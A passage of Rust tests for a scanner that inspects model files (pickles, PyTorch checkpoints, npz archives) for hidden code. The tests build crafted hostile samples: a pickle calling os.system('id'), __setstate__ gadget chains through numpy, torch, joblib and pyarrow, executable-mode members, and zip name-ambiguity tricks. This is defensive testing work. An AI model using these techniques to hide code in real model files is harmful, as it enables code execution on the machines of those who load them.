    assert!(l.is_ambiguous());
    // controls: a CRC that is not the raw name's, a version but 1 (Info-ZIP ignores either), a name the same as the
    // raw one: one name, no doubt, the storage read as one (quiet)
    for (what, x) in [("crc", upath(1, b"other", b"archive/hidden.pkl")), ("version", upath(2, raw, b"archive/hidden.pkl")),
                      ("same", upath(1, raw, raw))] {
        let z = ck(x.clone(), x);
        let l = listing(&z);
        assert!(!l.is_ambiguous() && l.entries.len() == 3, "{what}: {:?}", l.ambiguous);
        assert!(one("m.pt", &z).is_empty(), "{what}: {:?}", one("m.pt", &z));
    }
}

#[test]
fn an_executable_member_is_no_member_of_the_format() {
    // H4, the external re-review of Oct 27: a record or a storage a Unix system marked executable (mode 0100755)
    // keeps the archive opaque, named with its mode (or SC-BINARY, a program's bytes); 0100644 is the format's
    let ck = |name: &[u8], data: &[u8], mode: u32| {
        let e: Vec<Zx> = vec![(&b"archive/data.pkl"[..], &b"\x80\x02}."[..], vec![], vec![], 0o100644),
                              (&b"archive/version"[..], &b"3\n"[..], vec![], vec![], 0o100644),
                              (name, data, vec![], vec![], mode)];
        zip_x(&e)
    };
    let cases: [(&[u8], &[u8]); 3] = [(b"archive/byteorder", b"little"), (b"archive/data/0", b"#!/bin/sh\nexit 0\n"),
                                      (b"archive/data/0", &[0u8; 64])];
    for (name, data) in cases {
        let r = rd("m.pt", &ck(name, data, 0o100755)).unwrap();
        let f = rules(&r);
        let label = format!("In {}", String::from_utf8_lossy(name));
        assert!(r.opaque && (has(&f, "SC-NESTED-ARCHIVE", "MINOR", "Unix mode 100755") || has(&f, "SC-BINARY", "MAJOR", &label)),
                "{label}: {f:?}");
        assert!(f.iter().all(|(_, _, m)| m.starts_with(&label)), "{f:?}");
        let r = rd("m.pt", &ck(name, data, 0o100644)).unwrap();
        assert!(r.issues.is_empty() && !r.opaque, "{:?}", rules(&r));
    }
    // a program's bytes with the bit: SC-BINARY
    let exe = [b"\x7fELF".as_slice(), &[2, 1, 1], &[0u8; 120]].concat();
    let f = one("m.pt", &ck(b"archive/data/1", &exe, 0o100755));
    assert!(has(&f, "SC-BINARY", "MAJOR", "In archive/data/1"), "{f:?}");
}

#[test]
fn a_listing_is_bounded_whatever_its_end_records() {
    // H5, the external re-review of Oct 27: 8,000 members and 2,000 end records over one directory (each comment
    // running to the file's end) made a copy of the directory per record: one budget for the listing, each directory
    // read once, and past the end records read SC-TRUNCATED, in bounded time and memory
    let build = |n: usize, k: usize| {
        let mut body = Vec::new();
        let mut cd = Vec::new();
        for i in 0..n {
            let name = format!("{i}.npy");
            let at = body.len();
            body.extend(zloc(name.as_bytes(), b"", 0, b""));
            cd.extend(zcen(name.as_bytes(), b"", 0, at as u32, 0, 0o100644));
        }
        let mut z = [body.clone(), cd.clone()].concat();
        for i in 0..k {
            z.extend(zend(n as u16, cd.len(), body.len(), &vec![0u8; 0]));
            let len = z.len();
            z[len - 2..].copy_from_slice(&((22 * (k - i - 1)) as u16).to_le_bytes());
        }
        z
    };
    let t = std::time::Instant::now();
    let f = one("many.npz", &build(8000, 2000));
    assert!(has(&f, "SC-TRUNCATED", "CRITICAL", "end records"), "{f:?}");
    // 16 of them, over the one directory: read once, ambiguous
    let z = build(8000, 16);
    let l = zip::entries(&zip::Bytes::whole(&z), 100_000, 16_000_000).unwrap();
    assert!(l.entries.len() == 8000 && l.ambiguous.iter().any(|a| a.contains("end records")), "{:?}", l.ambiguous);
    assert!(t.elapsed().as_secs() < 20, "{:?}", t.elapsed());
}

/// `z` with the central entry named `name` made by `made_by` (its "version made by": the system in its high byte).
fn with_made_by(mut z: Vec<u8>, name: &[u8], made_by: u16) -> Vec<u8> {
    let mut at = 0;
    while let Some(k) = z[at..].windows(4).position(|w| w == b"PK\x01\x02") {
        let p = at + k;
        let n = u16::from_le_bytes([z[p + 28], z[p + 29]]) as usize;
        if &z[p + 46..p + 46 + n] == name {
            z[p + 4..p + 6].copy_from_slice(&made_by.to_le_bytes());
        }
        at = p + 4;
    }
    z
}

#[test]
fn every_unicode_path_field_names_the_member() {
    // the external re-review of Oct 27 (its second, H1): two valid Unicode Path fields, the first naming the storage
    // as it is and the second archive/hidden.pkl (Info-ZIP and Python 3.12's zipfile take the later); an invalid first
    // (a bad CRC, version 2) must not hide a valid later one; a central entry with two and a local header with one
    let raw: &[u8] = b"archive/data/0";
    let bad = os_system("id");
    let ck = |cx: Vec<u8>, lx: Vec<u8>| {
        let e: Vec<Zx> = vec![(&b"archive/data.pkl"[..], &b"\x80\x02}."[..], vec![], vec![], 0o100644),
                              (&b"archive/version"[..], &b"3\n"[..], vec![], vec![], 0o100644),
                              (raw, bad.as_slice(), cx, lx, 0o100644)];
        zip_x(&e)
    };
    let hidden = upath(1, raw, b"archive/hidden.pkl");
    let two = |first: Vec<u8>| [first, hidden.clone()].concat();
    for (what, z) in [("first the same", ck(two(upath(1, raw, raw)), two(upath(1, raw, raw)))),
                      ("central two, local the same", ck(two(upath(1, raw, raw)), upath(1, raw, raw))),
                      ("first a bad CRC", ck(two(upath(1, b"x", b"archive/other.pkl")), two(upath(1, b"x", b"archive/other.pkl")))),
                      ("first version 2", ck(two(upath(2, raw, b"archive/other.pkl")), two(upath(2, raw, b"archive/other.pkl"))))] {
        let l = zip::entries(&zip::Bytes::whole(&z), 1000, 1 << 20).unwrap();
        assert!(l.entries.iter().any(|e| e.name == b"archive/hidden.pkl") && l.is_ambiguous(), "{what}: {:?}", l.ambiguous);
        assert!(!l.entries.iter().any(|e| e.name == b"archive/other.pkl"), "{what}: an invalid field names nothing");
        let f = one("m.pt", &z);
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "os.system") && has(&f, "SC-TRUNCATED", "CRITICAL", "may not list"),
                "{what}: {f:?}");
    }
    // two fields that both name it as it is: no other name, but readers' choice is still two fields' (ambiguous)
    for (cx, lx) in [([upath(1, raw, raw), upath(1, raw, raw)].concat(), vec![]),
                     (vec![], [upath(1, raw, raw), upath(1, b"x", b"archive/other.pkl")].concat())] {
        let l = zip::entries(&zip::Bytes::whole(&ck(cx, lx)), 1000, 1 << 20).unwrap();
        assert!(l.is_ambiguous() && l.entries.len() == 3, "{:?}", l.ambiguous);
    }
}

#[test]
fn a_class_handed_to_a_constructor_decides_whether_it_is_data() {
    // the external re-review of Oct 27 (its second, H2): array._array_reconstructor(<an array subclass with __call__>,
    // 'i', 8, b'\0\0\0\0') as the __setstate__ a BUILD installs: a callable; array.array's: data; numpy's scalar of
    // dtype object is the object it is handed
    let made = |m: &str, n: &str| P::default().proto(2).global("collections", "UserDict").et().reduce().ed()
        .s("__setstate__").global("array", "_array_reconstructor").mark().global(m, n).s("i").int(8).bytes(&[0u8; 4])
        .tuple().reduce().setitem().build().none().build().stop();
    let f = one("m.pkl", &made("review_array", "CallableArray"));
    assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "__setstate__"), "{f:?}");
    assert!(!has(&one("m.pkl", &made("array", "array")), "SC-PICKLE-CODE", "CRITICAL", ""));
    let obj = |code: &str| P::default().proto(2).global("collections", "UserDict").et().reduce().ed().s("__setstate__")
        .global("numpy._core.multiarray", "scalar").global("numpy", "dtype").s(code).raw(b"\x89\x88").t3().reduce()
        .global("mypkg.helpers", "run").t2().reduce().setitem().build().none().build().stop();
    assert!(has(&one("m.pkl", &obj("O8")), "SC-PICKLE-CODE", "CRITICAL", "__setstate__"), "{:?}", one("m.pkl", &obj("O8")));
}

#[test]
fn a_members_mode_is_judged_whatever_system_made_it() {
    // the external re-review of Oct 27 (its second, H3 and H4): Info-ZIP applies the mode of creator 16 (BeOS), and
    // others; a symlink, a directory, a FIFO is no record or storage of the format, whatever its name
    let ck = |name: &[u8], data: &[u8], mode: u32, made_by: u16| {
        let e: Vec<Zx> = vec![(&b"archive/data.pkl"[..], &b"\x80\x02}."[..], vec![], vec![], 0o100644),
                              (&b"archive/version"[..], &b"3\n"[..], vec![], vec![], 0o100644),
                              (name, data, vec![], vec![], mode)];
        with_made_by(zip_x(&e), name, made_by)
    };
    let cases: [(&[u8], &[u8]); 2] = [(b"archive/byteorder", b"little"), (b"archive/data/0", b"#!/bin/sh\nexit 0\n")];
    for (name, data) in cases {
        let label = format!("In {}", String::from_utf8_lossy(name));
        for made_by in [(16u16 << 8) | 20, (11 << 8) | 20, 20, (3 << 8) | 30] {
            let r = rd("m.pt", &ck(name, data, 0o100755, made_by)).unwrap();
            assert!(r.opaque && has(&rules(&r), "SC-NESTED-ARCHIVE", "MINOR", "Unix mode 100755"), "{label} {made_by:x}: {:?}", rules(&r));
            // ... a regular file's 0644 or 0600, or no mode at all: the format's
            for mode in [0o100644, 0o100600, 0o644, 0] {
                let r = rd("m.pt", &ck(name, data, mode, made_by)).unwrap();
                assert!(r.issues.is_empty() && !r.opaque, "{label} {made_by:x} {mode:o}: {:?}", rules(&r));
            }
        }
        for (mode, kind) in [(0o120777, "symlink"), (0o040755, "directory"), (0o010644, "FIFO"), (0o020644, "character device")] {
            let r = rd("m.pt", &ck(name, data, mode, (3 << 8) | 30)).unwrap();
            let f = rules(&r);
            assert!(r.opaque && has(&f, "SC-NESTED-ARCHIVE", "MINOR", &format!("{label}, inside the model file: a member of type {kind}")),
                    "{label} {mode:o}: {f:?}");
        }
    }
}

#[test]
fn what_a_constructor_hands_on_is_data_only_when_what_it_is_handed_is() {
    // H2's audit (the external re-review of Oct 27, its second): a constructor whose value is an object of the class
    // its state names (joblib's wrappers, which joblib.load replaces with _reconstruct(subclass, …) under numpy before
    // 2.0), what it is handed (torch.jit's build_intlist), an object of its argument's type (torch's Parameter,
    // numpy's MaskedArray), or of the class its type names (pyarrow's array and scalar of an extension type): data
    // only when that is the format's own
    let setstate = |v: P| P::default().proto(2).global("collections", "UserDict").et().reduce().ed().s("__setstate__")
        .raw(&v.0).setitem().build().none().build().stop();
    let wrapped = |m: &str, n: &str| P::default().global("joblib.numpy_pickle_compat", "NDArrayWrapper").et().newobj()
        .ed().mark().s("subclass").global(m, n).s("filename").s("a.npy").s("allow_mmap").raw(&[0x89]).setitems().build();
    let zwrapped = |m: &str, n: &str| P::default().global("joblib.numpy_pickle_compat", "ZNDArrayWrapper").et().newobj()
        .ed().mark().s("filename").s("a.z").s("state").et().s("init_args").global(m, n).int(0).t1().bytes(b"b").t3()
        .setitems().build();
    let param = |inner: P| P::default().global("torch._utils", "_rebuild_parameter").raw(&inner.0).raw(&[0x89])
        .global("collections", "OrderedDict").et().reduce().t3().reduce();
    let sub = |m: &str, n: &str| P::default().global("torch._utils", "_rebuild_wrapper_subclass").global(m, n).t1().reduce();
    let masked = |inner: P| P::default().global("numpy.ma.core", "MaskedArray").raw(&inner.0).t1().reduce();
    let recon = |m: &str, n: &str| P::default().global("numpy._core.multiarray", "_reconstruct").global(m, n).int(0).t1()
        .bytes(b"b").t3().reduce();
    let ext = P::default().global("review_types", "CallableType").et().newobj();
    let alias = P::default().global("pyarrow.lib", "type_for_alias").s("int64").t1().reduce();
    let pscalar = |t: &P| P::default().global("pyarrow.lib", "scalar").int(1).raw(&t.0).t2().reduce();
    let parray = |t: &P| P::default().global("pyarrow.lib", "_restore_array").mark().raw(&t.0).int(0).int(0).et().et()
        .int(0).none().tuple().t1().reduce();
    let intlist = P::default().global("torch.jit._pickle", "build_intlist").global("review_array", "run").t1().reduce();
    for (what, v, code) in [
        ("NDArrayWrapper of a callable class", wrapped("review_array", "CallableArray"), true),
        ("NDArrayWrapper of ndarray", wrapped("numpy", "ndarray"), false),
        ("ZNDArrayWrapper of a callable class", zwrapped("review_array", "CallableArray"), true),
        ("ZNDArrayWrapper of ndarray", zwrapped("numpy", "ndarray"), false),
        ("Parameter of a callable tensor", param(sub("review_array", "CallableTensor")), true),
        ("Parameter of a tensor", param(sub("torch", "Tensor")), false),
        ("MaskedArray of a callable array", masked(recon("review_array", "CallableArray")), true),
        ("MaskedArray of an array", masked(recon("numpy", "ndarray")), false),
        ("pyarrow scalar of an extension type", pscalar(&ext), true),
        ("pyarrow scalar of int64", pscalar(&alias), false),
        ("pyarrow array of an extension type", parray(&ext), true),
        ("pyarrow array of int64", parray(&alias), false),
        ("build_intlist", intlist, true),
    ] {
        let f = one("m.pkl", &setstate(v));
        assert_eq!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "__setstate__"), code, "{what}: {f:?}");
    }
    // a parameter of a parameter of … past the depth followed: not data
    let mut deep = sub("torch", "Tensor");
    for _ in 0..40 {
        deep = masked(deep);
    }
    assert!(has(&one("m.pkl", &setstate(deep)), "SC-PICKLE-CODE", "CRITICAL", "__setstate__"));
}

#[test]
fn a_cap_that_drops_findings_says_how_many() {
    // (the external re-review of Oct 28, its LOW: the places code runs past 64, the members' findings past 64 and the
    // parts that could not be read past 16 were passed over without a word; each is counted now, and the count said
    // as SC-TRUNCATED, as the nested loads past 64 are; what is listed, and so the verdict, as before)
    let classes = |n: usize| {
        let mut p = P::default().proto(2);
        for k in 0..n {
            p = p.global("builtins", "type").s(&format!("C{k}")).et().ed().t3().reduce().raw(b"0");
        }
        p.none().stop()
    };
    let exe = [b"MZ".as_slice(), &[0u8; 256]].concat();
    let members = |n: usize| {
        let names: Vec<String> = (0..n).map(|k| format!("archive/extra/tool{k}.exe")).collect();
        let mut e: Vec<(&str, &[u8])> = vec![("archive/data.pkl", b"\x80\x02N."), ("archive/byteorder", b"little"),
                                             ("archive/version", b"3\n")];
        e.extend(names.iter().map(|n| (n.as_str(), exe.as_slice())));
        zip_of(&e)
    };
    let bad_npy = b"\x93NUMPY\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00".to_vec();
    let npz = |n: usize| {
        let names: Vec<String> = (0..n).map(|k| format!("a{k}.npy")).collect();
        zip_of(&names.iter().map(|n| (n.as_str(), bad_npy.as_slice())).collect::<Vec<_>>())
    };
    let notes = |f: &[(String, String, String)]| -> Vec<String> {
        f.iter().filter(|(r, _, m)| r == "SC-TRUNCATED" && m.contains(" were not listed (more than ")).map(|x| x.2.clone()).collect()
    };
    for n in [64usize, 70] {
        let f = one("m.pkl", &classes(n));
        assert!(has(&f, "SC-PICKLE-CODE", "CRITICAL", "makes a class with builtins.type"), "{n}: {f:?}");
        let said = has(&f, "SC-TRUNCATED", "CRITICAL", "6 more places the pickles run code were not listed (more than 64)");
        assert!(said == (n == 70) && notes(&f).len() == usize::from(n == 70), "{n}: {f:?}");
        // the same pickle as a checkpoint's
        let f = one("m.pt", &checkpoint(&classes(n)));
        assert_eq!(has(&f, "SC-TRUNCATED", "CRITICAL", "6 more places the pickles run code were not listed"), n == 70, "{n}: {f:?}");

        let f = one("m.pt", &members(n));
        assert_eq!(f.iter().filter(|(r, s, _)| r == "SC-BINARY" && s == "MAJOR").count(), 64, "{n}: {f:?}");
        let said = has(&f, "SC-TRUNCATED", "CRITICAL", "6 more findings in the model file's members were not listed (more than 64)");
        assert!(said == (n == 70) && notes(&f).len() == usize::from(n == 70), "{n}: {f:?}");
    }
    for n in [16usize, 20] {
        let f = one("m.npz", &npz(n));
        let cut = f.iter().filter(|(r, _, m)| r == "SC-TRUNCATED" && m.contains("a version numpy does not write")).count();
        assert_eq!(cut, 16, "{n}: {f:?}");
        let said = has(&f, "SC-TRUNCATED", "CRITICAL",
                       "4 more parts of the model file that could not be read were not listed (more than 16)");
        assert!(said == (n == 20) && notes(&f).len() == usize::from(n == 20), "{n}: {f:?}");
    }
    // a nested checkpoint's counts are said, named for where it was
    let inner = members(70);
    let outer = P::default().proto(2).global("torch.storage", "_load_from_bytes").bytes(&inner).t1().reduce().stop();
    let f = one("m.pkl", &outer);
    assert!(has(&f, "SC-TRUNCATED", "CRITICAL", ": 6 more findings in the model file's members were not listed"), "{f:?}");
}
